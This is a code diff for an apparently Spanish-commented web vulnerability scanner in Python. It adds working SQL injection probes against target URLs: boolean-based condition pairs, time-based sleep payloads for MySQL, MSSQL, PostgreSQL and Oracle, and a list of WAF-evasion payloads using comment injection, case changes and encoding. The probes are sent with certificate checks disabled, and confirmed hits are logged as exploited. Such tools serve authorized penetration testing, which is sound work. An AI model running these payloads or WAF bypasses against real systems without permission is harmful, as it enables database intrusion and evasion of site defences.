@@ -1,6 +1,7 @@
 import requests
 import random
 import re
+import time as _time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, parse_qs, urljoin, quote
 from bs4 import BeautifulSoup
@@ -57,6 +58,172 @@ def _is_non_injectable_param(param: str) -> bool:
     if _HASHED_PAGE_RE.match(p):
         return True
     return False
+
+# ---------------------------------------------------------------------------
+# ANÁLISIS MULTI-CAPA PARA SQLi
+# ---------------------------------------------------------------------------
+
+# Pares (condición_true, condición_false) para boolean-based detection
+_SQLI_BOOLEAN_PAIRS: list = [
+    ("' AND '1'='1", "' AND '1'='2"),
+    ("' AND 1=1--", "' AND 1=2--"),
+    ("1 AND 1=1", "1 AND 1=2"),
+    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
+    ("' OR 1=1--", "' OR 1=2--"),
+]
+
+# Payloads time-based por motor de base de datos
+_SQLI_TIME_PAYLOADS: list = [
+    ("' OR SLEEP(3)--",               "mysql"),
+    ("1; WAITFOR DELAY '0:0:3'--",    "mssql"),
+    ("' OR pg_sleep(3)--",            "postgresql"),
+    ("1 AND SLEEP(3)",                "mysql"),
+    ("' OR 3=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", "oracle"),
+]
+
+# Payloads WAF bypass (comment injection, case, encoding, tab)
+_SQLI_WAF_BYPASS_PAYLOADS: list = [
+    "'/**/OR/**/1=1--",
+    "' Or 1=1--",
+    "' /*!OR*/ 1=1--",
+    "'\t OR\t 1=1--",
+    "' OR 0x31=0x31--",
+    "'||'1'='1",
+    "%27%20OR%201%3D1--",
+    "\\' OR 1=1--",
+]
+
+# Umbral de tiempo para considerar time-based exitoso
+_SQLI_TIME_THRESHOLD: float = 2.5
+
+# Params que habitualmente consultan BD (heurística para activar time-based)
+_SQL_LIKELY_PARAMS: frozenset = frozenset({
+    "id", "uid", "user_id", "userid", "product_id", "item_id", "cat_id",
+    "category", "search", "query", "q", "s", "filter", "sort", "order",
+    "page", "p", "start", "offset", "limit", "num",
+    "login", "username", "user", "email",
+    "name", "title", "slug", "key",
+})
+
+
+def _sqli_test_boolean(base_url: str, param: str, method: str,
+                        headers: dict, baseline_text: str) -> tuple:
+    """
+    Prueba boolean-based SQLi comparando respuestas de condición TRUE vs FALSE.
+    Retorna (True, payload_true) si hay diferencia significativa (≥20% de longitud).
+    Solo se activa cuando la respuesta ya cambió respecto al baseline pero
+    no hubo error SQL detectado.
+    """
+    len_baseline = len(baseline_text)
+    if len_baseline == 0:
+        return False, ""
+
+    for true_p, false_p in _SQLI_BOOLEAN_PAIRS[:3]:
+        try:
+            if method == "get":
+                r_true  = requests.get(base_url, params={param: true_p},  headers=headers, verify=False, timeout=5)
+                r_false = requests.get(base_url, params={param: false_p}, headers=headers, verify=False, timeout=5)
+            else:
+                r_true  = requests.post(base_url, data={param: true_p},  headers=headers, verify=False, timeout=5)
+                r_false = requests.post(base_url, data={param: false_p}, headers=headers, verify=False, timeout=5)
+
+            if r_true.status_code != 200 or r_false.status_code != 200:
+                continue
+
+            diff_true  = abs(len(r_true.text)  - len_baseline) / len_baseline
+            diff_false = abs(len(r_false.text) - len_baseline) / len_baseline
+
+            # TRUE debe parecerse al baseline; FALSE debe divergir ≥20%
+            if diff_true < 0.15 and diff_false >= 0.20:
+                return True, true_p
+        except Exception:
+            continue
+    return False, ""
+
+
+def _sqli_test_time_based(base_url: str, param: str, method: str,
+                           headers: dict) -> tuple:
+    """
+    Prueba time-based SQLi con doble confirmación para evitar falsos positivos por
+    latencia de red o servidor lento:
+      1. Mide el tiempo base con un valor benigno.
+      2. Envía el payload SLEEP y verifica que tarde >= (baseline + sleep_secs * 0.75).
+      3. Repite el payload una segunda vez para confirmar consistencia.
+    Retorna (True, payload, db_type) solo si ambas confirmaciones pasan.
+    """
+    # Medir baseline con valor benigno
+    try:
+        t0 = _time.time()
+        if method == "get":
+            requests.get(base_url, params={param: "1"}, headers=headers, verify=False, timeout=7)
+        else:
+            requests.post(base_url, data={param: "1"}, headers=headers, verify=False, timeout=7)
+        baseline_time = _time.time() - t0
+    except Exception:
+        baseline_time = 0.5  # asumir 500ms si falla
+
+    sleep_secs = 3
+    required_delta = sleep_secs * 0.75  # el servidor debe tardar al menos 2.25s más que el baseline
+
+    for tp, db in _SQLI_TIME_PAYLOADS[:2]:
+        try:
+            # Primera medición con sleep
+            s1 = _time.time()
+            if method == "get":
+                requests.get(base_url, params={param: tp}, headers=headers, verify=False, timeout=10)
+            else:
+                requests.post(base_url, data={param: tp}, headers=headers, verify=False, timeout=10)
+            elapsed1 = _time.time() - s1
+
+            if elapsed1 - baseline_time < required_delta:
+                continue  # no hay delta suficiente, no es time-based real
+
+            # Segunda confirmación: re-enviar el payload para descartar fluctuación
+            s2 = _time.time()
+            if method == "get":
+                requests.get(base_url, params={param: tp}, headers=headers, verify=False, timeout=10)
+            else:
+                requests.post(base_url, data={param: tp}, headers=headers, verify=False, timeout=10)
+            elapsed2 = _time.time() - s2
+
+            if elapsed2 - baseline_time >= required_delta:
+                return True, tp, db
+
+        except requests.exceptions.Timeout:
+            # Timeout en ambas mediciones confirma SLEEP real
+            try:
+                s2 = _time.time()
+                if method == "get":
+                    requests.get(base_url, params={param: tp}, headers=headers, verify=False, timeout=10)
+                else:
+                    requests.post(base_url, data={param: tp}, headers=headers, verify=False, timeout=10)
+            except requests.exceptions.Timeout:
+                return True, tp, db
+            except Exception:
+                pass
+        except Exception:
+            continue
+    return False, "", ""
+
+
+def _sqli_test_waf_bypass(base_url: str, param: str, method: str,
+                           headers: dict) -> tuple:
+    """
+    Prueba payloads de WAF bypass cuando el scanner inicial recibió 403/406.
+    Retorna (True, payload) si alguno evadió el bloqueo y generó error SQL.
+    """
+    for wp in _SQLI_WAF_BYPASS_PAYLOADS:
+        try:
+            if method == "get":
+                r = requests.get(base_url, params={param: wp}, headers=headers, verify=False, timeout=5)
+            else:
+                r = requests.post(base_url, data={param: wp}, headers=headers, verify=False, timeout=5)
+            if r.status_code in (200, 500) and is_sqli_error_response(r.text):
+                return True, wp
+        except Exception:
+            continue
+    return False, ""
+
 
 def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, random_agent=False):
     sys.stdout.write('\033[1;36m<<<<<<<<<<<<\033[0m Testing SQL Injection \033[1;36m>>>>>>>>>>>>>>\033[0m\n')
@@ -136,28 +303,68 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
             
             try:
                 r = requests.get(base_url, params=data, headers=headers, verify=False, timeout=5)
-                
-                if r.status_code in (200, 500) and is_sqli_error_response(r.text) and r.text.lower() != baseline:
-                    # Verificar si ya se explotó esta combinación específica
-                    if not vuln_manager.is_already_exploited(base_url, param):
-                        # Verificar falso positivo (misma ruta con valor benigno en el parámetro)
-                        if not vuln_manager.verify_sqli_false_positive(
-                            base_url, "GET", param=param, custom_headers=custom_headers, random_agent=random_agent
+
+                def _report_sqli_get(win_payload, technique="ERROR-BASED"):
+                    if vuln_manager.is_already_exploited(base_url, param):
+                        return False
+                    # Para TIME-BASED la confirmación de FP es la doble medición
+                    # del propio _sqli_test_time_based; verify_sqli_false_positive
+                    # chequea errores SQL, lo que no aplica a timing.
+                    is_time_based = "TIME-BASED" in technique
+                    if not is_time_based:
+                        if vuln_manager.verify_sqli_false_positive(
+                            base_url, "GET", param=param,
+                            custom_headers=custom_headers, random_agent=random_agent
                         ):
-                            # Marcar como explotada
-                            vuln_manager.mark_as_exploited(base_url, param)
-                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
-                            
-                            # Salida sincronizada usando la nueva función
-                            with stdout_lock:
-                                encoded = quote(payload, safe='')
-                                print_vulnerability(f"\033[1;32m[GET][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
-                            
-                            urls_vulnerables.append(f"{base_url}?{param}={encoded}")
-                            # CORTAR INMEDIATAMENTE - no probar más payloads en esta URL
+                            return False
+                    with lock:
+                        if base_url in vulnerable_endpoints:
+                            return False
+                        vulnerable_endpoints.add(base_url)
+                    vuln_manager.mark_as_exploited(base_url, param)
+                    vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                    with stdout_lock:
+                        encoded = quote(win_payload, safe='')
+                        print_vulnerability(f"\033[1;32m[GET][{technique}]\033[0m {base_url}?{param}={encoded}")
+                    entry = f"{base_url}?{param}={quote(win_payload, safe='')}"
+                    if technique != "ERROR-BASED":
+                        entry += f"|||BYPASS_TECHNIQUE:{technique}|||BYPASS_ORIGINAL:{quote(payload, safe='')}"
+                    urls_vulnerables.append(entry)
+                    return True
+
+                # ── CAPA 1: Error-based (existente) ───────────────────────
+                if r.status_code in (200, 500) and is_sqli_error_response(r.text) and r.text.lower() != baseline:
+                    if _report_sqli_get(payload):
+                        current += 1
+                        update_progress(current, total_tasks)
+                        return
+
+                # ── CAPA 2: WAF bypass (403/406 bloqueó el payload inicial) ─
+                elif r.status_code in (403, 406, 429):
+                    ok, wp = _sqli_test_waf_bypass(base_url, param, "get", headers)
+                    if ok and _report_sqli_get(wp, "WAF-BYPASS"):
+                        current += 1
+                        update_progress(current, total_tasks)
+                        return
+
+                # ── CAPA 3: Boolean-based (respuesta cambió pero sin error) ─
+                elif (r.status_code == 200
+                      and r.text.lower() != baseline
+                      and base_url not in vulnerable_endpoints):
+                    ok, bp = _sqli_test_boolean(base_url, param, "get", headers, baseline)
+                    if ok and _report_sqli_get(bp, "BOOLEAN-BASED"):
+                        current += 1
+                        update_progress(current, total_tasks)
+                        return
+
+                    # ── CAPA 4: Time-based (param sospechoso sin diferencia clara) ─
+                    if param.lower() in _SQL_LIKELY_PARAMS and base_url not in vulnerable_endpoints:
+                        ok, tp, db = _sqli_test_time_based(base_url, param, "get", headers)
+                        if ok and _report_sqli_get(tp, f"TIME-BASED[{db}]"):
                             current += 1
                             update_progress(current, total_tasks)
                             return
+
             except requests.exceptions.Timeout:
                 continue
             except requests.exceptions.RequestException:
@@ -202,28 +409,67 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
             baseline = baseline_cache[baseline_key]
 
             try:
-                r = requests.post(base_url, data=data, headers=get_headers(random_agent=random_agent, custom_headers=custom_headers), verify=False, timeout=5)
-                
-                if r.status_code in (200, 500) and is_sqli_error_response(r.text) and r.text.lower() != baseline:
-                    # Verificar si ya se explotó esta combinación específica
-                    if not vuln_manager.is_already_exploited(base_url, param):
-                        if not vuln_manager.verify_sqli_false_positive(
-                            base_url, "POST", param=param, custom_headers=custom_headers, random_agent=random_agent
+                ph = get_headers(random_agent=random_agent, custom_headers=custom_headers)
+                r = requests.post(base_url, data=data, headers=ph, verify=False, timeout=5)
+
+                def _report_sqli_post(win_payload, technique="ERROR-BASED"):
+                    if vuln_manager.is_already_exploited(base_url, param):
+                        return False
+                    is_time_based = "TIME-BASED" in technique
+                    if not is_time_based:
+                        if vuln_manager.verify_sqli_false_positive(
+                            base_url, "POST", param=param,
+                            custom_headers=custom_headers, random_agent=random_agent
                         ):
-                            # Marcar como explotada
-                            vuln_manager.mark_as_exploited(base_url, param)
-                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
-                            
-                            # Salida sincronizada usando la nueva función
-                            with stdout_lock:
-                                encoded = quote(payload, safe='')
-                                print_vulnerability(f"\033[1;32m[POST][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
-                            
-                            urls_vulnerables.append(f"{base_url}?{param}={encoded}")
-                            # CORTAR INMEDIATAMENTE - no probar más payloads en esta URL
+                            return False
+                    with lock:
+                        if base_url in vulnerable_endpoints:
+                            return False
+                        vulnerable_endpoints.add(base_url)
+                    vuln_manager.mark_as_exploited(base_url, param)
+                    vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                    with stdout_lock:
+                        encoded = quote(win_payload, safe='')
+                        print_vulnerability(f"\033[1;32m[POST][{technique}]\033[0m {base_url}?{param}={encoded}")
+                    entry = f"{base_url}?{param}={quote(win_payload, safe='')}"
+                    if technique != "ERROR-BASED":
+                        entry += f"|||BYPASS_TECHNIQUE:{technique}|||BYPASS_ORIGINAL:{quote(payload, safe='')}"
+                    urls_vulnerables.append(entry)
+                    return True
+
+                # ── CAPA 1: Error-based ────────────────────────────────────
+                if r.status_code in (200, 500) and is_sqli_error_response(r.text) and r.text.lower() != baseline:
+                    if _report_sqli_post(payload):
+                        current += 1
+                        update_progress(current, total_tasks)
+                        return
+
+                # ── CAPA 2: WAF bypass ────────────────────────────────────
+                elif r.status_code in (403, 406, 429):
+                    ok, wp = _sqli_test_waf_bypass(base_url, param, "post", headers)
+                    if ok and _report_sqli_post(wp, "WAF-BYPASS"):
+                        current += 1
+                        update_progress(current, total_tasks)
+                        return
+
+                # ── CAPA 3: Boolean-based ─────────────────────────────────
+                elif (r.status_code == 200
+                      and r.text.lower() != baseline
+                      and base_url not in vulnerable_endpoints):
+                    ok, bp = _sqli_test_boolean(base_url, param, "post", headers, baseline)
+                    if ok and _report_sqli_post(bp, "BOOLEAN-BASED"):
+                        current += 1
+                        update_progress(current, total_tasks)
+                        return
+
+                    # ── CAPA 4: Time-based ────────────────────────────────
+                    if param.lower() in _SQL_LIKELY_PARAMS and base_url not in vulnerable_endpoints:
+                        ok, tp, db = _sqli_test_time_based(base_url, param, "post", headers)
+                        if ok and _report_sqli_post(tp, f"TIME-BASED[{db}]"):
                             current += 1
                             update_progress(current, total_tasks)
                             return
+
             except requests.exceptions.Timeout:
                 continue
             except requests.exceptions.RequestException:
@@ -282,26 +528,54 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
                 else:
                     res = requests.get(full_url, params=data, headers=headers, verify=False, timeout=5)
 
-                if res.status_code in (200, 500) and is_sqli_error_response(res.text) and res.text.lower() != baseline:
+                def _report_sqli_form(win_payload, win_data, technique="ERROR-BASED"):
                     if vuln_manager.is_already_exploited(full_url, form_param):
-                        continue
+                        return False
                     if vuln_manager.verify_sqli_false_positive(
-                        full_url, method.upper(), form_data=data, custom_headers=custom_headers, random_agent=random_agent
+                        full_url, method.upper(), form_data=win_data,
+                        custom_headers=custom_headers, random_agent=random_agent
                     ):
-                        continue
+                        return False
                     with lock:
                         if full_url not in vulnerable_endpoints:
                             vulnerable_endpoints.add(full_url)
                             vuln_manager.mark_as_exploited(full_url, form_param)
                             vuln_manager.mark_as_exploited(full_url, base_url_only=True)
-                            
-                            # Salida sincronizada usando la nueva función
                             with stdout_lock:
-                                encoded_data = {k: quote(v, safe='') for k, v in data.items()}
-                                print_vulnerability(f"\033[1;32m[FORM][VULNERABLE]\033[0m {full_url}\n{encoded_data}")
-                            
-                            urls_vulnerables.append(f"{full_url}")
-                            # CORTAR INMEDIATAMENTE - no probar más payloads en esta URL
+                                encoded_data = {k: quote(v, safe='') for k, v in win_data.items()}
+                                print_vulnerability(f"\033[1;32m[FORM][{technique}]\033[0m {full_url}\n{encoded_data}")
+                            entry = f"{full_url}"
+                            if technique != "ERROR-BASED":
+                                entry += f"|||BYPASS_TECHNIQUE:{technique}|||BYPASS_ORIGINAL:{quote(payload, safe='')}"
+                            urls_vulnerables.append(entry)
+                            return True
+                    return False
+
+                # ── CAPA 1: Error-based ────────────────────────────────────
+                if res.status_code in (200, 500) and is_sqli_error_response(res.text) and res.text.lower() != baseline:
+                    if _report_sqli_form(payload, data):
+                        current += 1
+                        update_progress(current, total_tasks)
+                        return
+
+                # ── CAPA 2: WAF bypass ────────────────────────────────────
+                elif res.status_code in (403, 406, 429):
+                    ok, wp = _sqli_test_waf_bypass(full_url, form_param, method, headers)
+                    if ok:
+                        bypass_data = {k: wp for k in data}
+                        if _report_sqli_form(wp, bypass_data, "WAF-BYPASS"):
+                            current += 1
+                            update_progress(current, total_tasks)
+                            return
+
+                # ── CAPA 3: Boolean-based ─────────────────────────────────
+                elif (res.status_code == 200
+                      and res.text.lower() != baseline
+                      and full_url not in vulnerable_endpoints):
+                    ok, bp = _sqli_test_boolean(full_url, form_param, method, headers, baseline)
+                    if ok:
+                        bool_data = {k: bp for k in data}
+                        if _report_sqli_form(bp, bool_data, "BOOLEAN-BASED"):
                             current += 1
                             update_progress(current, total_tasks)
                             return
